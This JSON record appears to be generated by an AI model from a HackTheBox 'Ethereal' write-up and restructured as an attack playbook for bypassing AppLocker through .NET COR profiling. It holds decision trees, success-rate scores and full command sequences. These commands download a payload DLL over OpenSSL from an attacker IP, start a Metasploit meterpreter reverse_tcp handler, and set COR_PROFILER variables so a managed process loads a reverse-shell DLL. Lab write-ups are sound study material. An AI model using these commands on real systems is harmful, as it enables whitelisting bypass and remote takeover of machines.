{
  "writeup_id": "Htb_Ethereal_Cor",
  "scenario_fingerprint": {
    "scenario_name": "windows_applocker_cor_profiling_bypass",
    "primary_services": [
      "http",
      "openssl",
      "custom_services"
    ],
    "port_signature": "80+443+custom",
    "service_combination": "web+ssl+restricted_shell",
    "os_family": "windows_server",
    "environment_type": "hardened_windows",
    "entry_vector": "cor_profiling_bypass",
    "privilege_path": "restricted_shell_to_full_shell",
    "attack_complexity": "medium",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "applocker_restrictions",
      "dotnet_framework_present",
      "managed_code_execution",
      "dual_openssl_connections"
    ],
    "environmental_clues": [
      "powershell_available",
      "visual_studio_build_environment",
      "restricted_execution_policy",
      "openssl_binary_present"
    ],
    "similar_scenarios": [
      "fighter_htb",
      "restricted_windows_environments"
    ],
    "unique_aspects": [
      "cor_profiler_dll_injection",
      "environment_variable_manipulation",
      "beryllium_dll_usage",
      "dual_listener_shell_upgrade"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "COR_Profiling_AppLocker_Bypass",
        "success_reason": "AppLocker did not restrict .NET CLR profiler DLL loading mechanism",
        "prerequisite_indicators": [
          "applocker_enabled",
          "dotnet_framework_available",
          "managed_executables_present",
          "dll_write_permissions_exist"
        ],
        "recognition_patterns": [
          "managed executables available (powershell, tzsync)",
          "ability to write DLLs to accessible paths",
          "environment variable modification possible",
          "AppLocker blocking standard executables"
        ],
        "failure_modes": [
          "no_dotnet_framework",
          "cor_profiling_disabled_globally",
          "no_managed_executables",
          "dll_write_blocked"
        ],
        "environmental_factors": [
          "default_applocker_configuration",
          "dotnet_framework_installed",
          "insufficient_cor_profiling_restrictions",
          "writable_system_directories"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "10-20 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "AppLocker bypass via COR Profiling",
        "discovery_method": "Environment variable manipulation + managed executable",
        "why_critical": "Bypassed application whitelisting to execute arbitrary code",
        "how_to_recognize": [
          "AppLocker blocking standard shells",
          ".NET Framework present on system",
          "Managed executables available",
          "DLL write permissions exist"
        ],
        "follow_up_actions": [
          "create_reverse_shell_dll",
          "set_cor_environment_variables",
          "execute_managed_process",
          "establish_persistent_shell"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "restricted_user_with_applocker",
        "escalation_method": "COR_Profiling_to_unrestricted_execution",
        "why_possible": "AppLocker did not account for .NET CLR profiler loading mechanism",
        "recognition_signs": [
          "applocker_blocking_executables",
          "dotnet_framework_available",
          "environment_variable_control",
          "dll_creation_possible"
        ],
        "exploitation_path": "Create malicious DLL → Set COR variables → Execute managed process → Bypass AppLocker"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "AppLocker blocking standard shell execution methods",
        "decision": "Attempt COR Profiling bypass for managed code execution",
        "reasoning": "AppLocker typically doesn't block .NET profiling mechanisms, allowing DLL injection",
        "confidence": 0.85,
        "alternatives": [
          {
            "option": "powershell_constrained_language_bypass",
            "when": "if COR profiling unavailable"
          },
          {
            "option": "living_off_the_land_binaries",
            "when": "if .NET framework not present"
          }
        ],
        "success_indicators": [
          "dotnet_framework_present",
          "managed_executables_available",
          "environment_variables_settable"
        ],
        "next_decision": "choose_dll_payload_method"
      },
      {
        "step": 2,
        "situation": "COR Profiling environment confirmed available",
        "decision": "Use existing Beryllium.dll for quick meterpreter or build custom reverse shell DLL",
        "reasoning": "Beryllium provides immediate meterpreter access, custom DLL allows specific payload customization",
        "confidence": 0.9,
        "prerequisites": [
          "cor_profiling_supported",
          "dll_upload_capability"
        ],
        "success_indicators": [
          "dll_successfully_uploaded",
          "environment_variables_set"
        ],
        "failure_fallbacks": [
          "custom_dll_compilation",
          "alternative_payload_formats"
        ]
      },
      {
        "step": 3,
        "situation": "Limited file upload capabilities through OpenSSL connections",
        "decision": "Use SSL file transfer method with ncat for payload delivery",
        "reasoning": "Leverages existing OpenSSL binary on target for secure file transfer",
        "confidence": 0.8,
        "prerequisites": [
          "openssl_binary_available",
          "ssl_certificates_prepared"
        ],
        "success_indicators": [
          "file_transfer_completed",
          "payload_integrity_maintained"
        ],
        "failure_fallbacks": [
          "base64_encoding_transfer",
          "powershell_download_cradle"
        ]
      }
    ],
    "branching_logic": {
      "if_applocker_detected": {
        "action": "attempt_cor_profiling_bypass",
        "tools": [
          "custom_dll",
          "beryllium_dll",
          "visual_studio"
        ],
        "next_phase": "payload_delivery_and_execution"
      },
      "if_dotnet_framework_present": {
        "action": "set_cor_environment_variables",
        "variables": [
          "COR_ENABLE_PROFILING=1",
          "COR_PROFILER={valid-guid}",
          "COR_PROFILER_PATH=dll_path"
        ],
        "execution_targets": [
          "powershell",
          "tzsync",
          "any_managed_executable"
        ]
      },
      "if_limited_upload_capability": {
        "action": "use_available_transfer_method",
        "methods": [
          "openssl_s_client",
          "ncat_ssl",
          "base64_encoding"
        ],
        "decision_criteria": "based_on_available_binaries_and_network_access"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_dotnet_framework_presence_on_windows",
        "reasoning": "enables_cor_profiling_bypass_opportunity",
        "applicability": "windows_targets_with_applocker_or_restrictions"
      },
      {
        "rule": "prepare_ssl_certificates_for_secure_file_transfer",
        "reasoning": "enables_payload_delivery_through_openssl_when_other_methods_blocked",
        "applicability": "targets_with_openssl_binary_available"
      },
      {
        "rule": "use_beryllium_dll_for_quick_meterpreter_access",
        "reasoning": "pre_built_payload_with_environment_variable_configuration",
        "applicability": "when_meterpreter_session_preferred_over_custom_shell"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "COR_Profiling_AppLocker_Bypass",
        "mitre_id": "T1055.012",
        "required_services": [
          "dotnet_framework"
        ],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "dotnet_framework_installed",
          "managed_code_executables_present",
          "applocker_blocking_standard_executables",
          "dll_write_permissions"
        ],
        "success_indicators": [
          "powershell_exe_available",
          "tzsync_exe_available",
          "managed_executables_identified",
          "environment_variables_settable"
        ],
        "incompatible_with": [
          "no_dotnet_framework",
          "dll_execution_blocked",
          "environment_variable_restrictions",
          "managed_code_disabled"
        ],
        "confidence_boosters": [
          "applocker_policy_detected",
          "powershell_constrained_language_mode",
          "standard_executables_blocked",
          "legacy_windows_versions"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "2-5 minutes"
      },
      {
        "technique": "Custom_DLL_Injection",
        "mitre_id": "T1055.001",
        "required_services": [],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "dll_compilation_capability",
          "visual_studio_or_compiler_access",
          "target_architecture_known"
        ],
        "success_indicators": [
          "dll_successfully_compiled",
          "reverse_shell_code_available",
          "network_connectivity_confirmed"
        ],
        "incompatible_with": [
          "no_development_tools",
          "network_egress_blocked",
          "dll_signature_requirements"
        ],
        "confidence_boosters": [
          "existing_reverse_shell_templates",
          "c_plus_plus_compiler_available",
          "target_system_architecture_x64"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "10-20 minutes"
      }
    ],
    "environmental_detectors": {
      "dotnet_framework": {
        "port_indicators": [],
        "service_indicators": [
          "dotnet",
          "clr"
        ],
        "banner_indicators": [
          ".NET Framework",
          "Common Language Runtime"
        ],
        "file_indicators": [
          "powershell.exe",
          "tzsync.exe",
          "*.exe.config"
        ],
        "registry_indicators": [
          "HKLM\\SOFTWARE\\Microsoft\\.NETFramework"
        ],
        "confidence_threshold": 0.8
      },
      "applocker_environment": {
        "port_indicators": [],
        "service_indicators": [
          "applocker"
        ],
        "banner_indicators": [
          "AppLocker",
          "Code Integrity"
        ],
        "behavior_indicators": [
          "executable_blocking",
          "constrained_language_mode"
        ],
        "confidence_threshold": 0.75
      },
      "managed_code_environment": {
        "port_indicators": [],
        "service_indicators": [
          "powershell",
          "dotnet"
        ],
        "file_indicators": [
          "powershell.exe",
          "*.dll",
          "*.exe.config"
        ],
        "confidence_threshold": 0.85
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "cor_profiling_bypass",
          "when": "applocker_detected_and_dotnet_present",
          "reason": "high_success_rate_bypasses_application_whitelisting"
        },
        {
          "attack": "beryllium_dll_usage",
          "when": "meterpreter_session_needed",
          "reason": "pre_built_solution_with_environment_variable_config"
        }
      ],
      "medium_priority": [
        {
          "attack": "custom_dll_development",
          "when": "specific_payload_requirements",
          "reason": "flexible_but_requires_development_time"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "COR Profiling AppLocker Bypass",
        "mitre_id": "T1055.012",
        "category": "defense_evasion",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "Custom DLL",
            "command_template": "set \"COR_ENABLE_PROFILING=1\" && set \"COR_PROFILER={guid}\" && set \"COR_PROFILER_PATH={dll_path}\" && {managed_exe}",
            "actual_command": "set \"COR_ENABLE_PROFILING=1\" && set \"COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\" && set \"COR_PROFILER_PATH=C:\\users\\0xdf\\desktop\\revshell.dll\" && powershell",
            "output_pattern": "Managed process hangs, reverse shell connects",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "Beryllium.dll",
            "command_template": "set \"COR_ENABLE_PROFILING=1\" && set \"COR_PROFILER={guid}\" && set \"COR_PROFILER_PATH={beryllium_path}\" && set \"PORT={port}\" && set \"IP={ip}\" && {managed_exe}",
            "actual_command": "set \"COR_ENABLE_PROFILING=1\" && set \"COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\" && set \"COR_PROFILER_PATH=C:\\users\\0xdf\\desktop\\Beryllium.dll\" && set \"PORT=136\" && set \"IP=10.1.1.41\" && powershell",
            "success_factors": [
              "managed_executable_available",
              "dll_upload_successful",
              "network_connectivity"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "applocker_blocking_standard_executables",
          "dotnet_framework_installed",
          "managed_executables_available",
          "dll_upload_capability"
        ],
        "success_indicators": [
          "managed_process_hangs_after_execution",
          "reverse_shell_connection_established",
          "arbitrary_code_execution_achieved"
        ],
        "common_failures": [
          "invalid_guid_format",
          "dll_path_incorrect",
          "no_managed_executables_available",
          "network_connectivity_blocked"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "persistence_establishment",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "OpenSSL File Transfer",
        "mitre_id": "T1105",
        "category": "command_and_control",
        "phase": "execution",
        "tools_used": [
          {
            "name": "ncat",
            "command_template": "ncat --ssl --send-only --ssl-key {key} --ssl-cert {cert} -lvp {port} < {file}",
            "actual_command": "ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem -lvp 73 < Beryllium.dll",
            "output_pattern": "Connection established, file transferred",
            "effectiveness_rating": 4,
            "reliability": 0.9
          },
          {
            "name": "openssl client",
            "command_template": "openssl.exe s_client -quiet -connect {ip}:{port} > {output_file}",
            "actual_command": "c:\\progra~2\\openss~1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.14:73 > c:\\windows\\servicing\\packages\\df.dll",
            "success_factors": [
              "ssl_certificates_available",
              "openssl_binary_accessible"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "openssl_binary_available",
          "ssl_certificates_generated",
          "network_connectivity",
          "write_permissions_target_directory"
        ],
        "success_indicators": [
          "file_transfer_completes_successfully",
          "target_file_created_correct_size",
          "no_transfer_errors_reported"
        ],
        "common_failures": [
          "ssl_certificate_issues",
          "network_connectivity_problems",
          "insufficient_write_permissions",
          "antivirus_blocking_transfer"
        ],
        "follow_up_techniques": [
          "cor_profiling_bypass",
          "dll_execution",
          "persistence_establishment"
        ],
        "time_investment": "5-10 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Beryllium.dll",
        "use_case": "applocker_bypass_meterpreter",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "applocker_environments"
        ],
        "alternatives": [
          "custom_dll_creation",
          "other_profiling_dlls"
        ],
        "best_practices": [
          "use_valid_guid_format",
          "ensure_managed_executable_available",
          "test_network_connectivity_first",
          "use_writable_directory_for_dll"
        ]
      },
      {
        "tool": "Visual Studio DLL Creation",
        "use_case": "custom_payload_development",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "medium",
        "essential_for": [
          "custom_payload_requirements"
        ],
        "alternatives": [
          "mingw_gcc",
          "prebuilt_dlls"
        ],
        "best_practices": [
          "use_dllmain_process_attach",
          "include_proper_headers",
          "test_compilation_before_deployment",
          "ensure_architecture_compatibility"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "cor_profiling_meterpreter_bypass",
        "steps": [
          {
            "step": 1,
            "command": "ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem -lvp 73 < Beryllium.dll",
            "purpose": "Serve DLL over SSL",
            "expected_output": "Listening on port 73"
          },
          {
            "step": 2,
            "command": "c:\\progra~2\\openss~1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.14:73 > c:\\windows\\servicing\\packages\\df.dll",
            "purpose": "Download DLL to target",
            "expected_output": "File transfer completion"
          },
          {
            "step": 3,
            "command": "handler -H tun0 -P 136 -p windows/x64/meterpreter/reverse_tcp",
            "purpose": "Start Metasploit handler",
            "expected_output": "Handler running as background job"
          },
          {
            "step": 4,
            "command": "set \"COR_ENABLE_PROFILING=1\" && set \"COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\" && set \"COR_PROFILER_PATH=C:\\windows\\servicing\\packages\\df.dll\" && set \"IP=10.10.14.14\" && set \"PORT=136\" && tzsync",
            "purpose": "Execute COR profiling bypass",
            "expected_output": "Meterpreter session established"
          }
        ],
        "success_rate": 0.92,
        "typical_duration": "15-25 minutes"
      },
      {
        "sequence_name": "custom_dll_cor_bypass",
        "steps": [
          {
            "step": 1,
            "command": "Create Visual Studio DLL project with reverse shell code",
            "purpose": "Build custom payload DLL",
            "expected_output": "Compiled DLL file"
          },
          {
            "step": 2,
            "command": "set \"COR_ENABLE_PROFILING=1\"",
            "purpose": "Enable COR profiling",
            "expected_output": "Environment variable set"
          },
          {
            "step": 3,
            "command": "set \"COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\"",
            "purpose": "Set profiler GUID",
            "expected_output": "Environment variable set"
          },
          {
            "step": 4,
            "command": "set \"COR_PROFILER_PATH=C:\\users\\0xdf\\desktop\\revshell.dll\"",
            "purpose": "Set DLL path",
            "expected_output": "Environment variable set"
          },
          {
            "step": 5,
            "command": "powershell",
            "purpose": "Execute managed process",
            "expected_output": "Reverse shell connection"
          }
        ],
        "success_rate": 0.88,
        "typical_duration": "20-35 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Ethereal COR Profiling",
      "difficulty": "Hard",
      "os": "Windows",
      "platform": "HackTheBox",
      "release_date": "2019",
      "author": "0xdf",
      "estimated_time": "2-3 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "applocker_bypass",
        "cor_profiling",
        "dotnet_exploitation"
      ],
      "key_vulnerabilities": [
        "applocker_misconfiguration",
        "cor_profiler_abuse",
        "managed_code_execution"
      ],
      "environment_type": "hardened_windows_system",
      "real_world_relevance": "very_high",
      "learning_value": [
        "applocker_bypass_techniques",
        "dotnet_framework_exploitation",
        "cor_profiling_abuse"
      ],
      "prerequisite_knowledge": [
        "dotnet_framework_concepts",
        "windows_security_controls",
        "advanced_exploitation_techniques"
      ]
    },
    "categorization": {
      "primary_category": "defense_evasion",
      "subcategories": [
        "applocker_bypass",
        "code_execution",
        "dotnet_exploitation"
      ],
      "attack_types": [
        "defense_evasion",
        "execution",
        "persistence"
      ],
      "defensive_lessons": [
        "proper_applocker_configuration",
        "cor_profiler_restrictions",
        "managed_code_monitoring"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Fighter",
        "Ethereal",
        "Blackfield"
      ],
      "similarity_reasons": [
        "applocker_restrictions",
        "advanced_bypass_techniques",
        "hardened_environments"
      ],
      "unique_aspects": [
        "cor_profiling_technique",
        "dotnet_framework_abuse",
        "meterpreter_shell_bypass"
      ],
      "difficulty_factors": [
        "complex_bypass_mechanism",
        "advanced_dotnet_knowledge",
        "multi_stage_exploitation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T01:17:04.491091",
    "original_file": "0xdf_writeups/Htb Ethereal Cor.md",
    "content_length": 11288,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 0.8333333333333334,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 0.3333333333333333,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}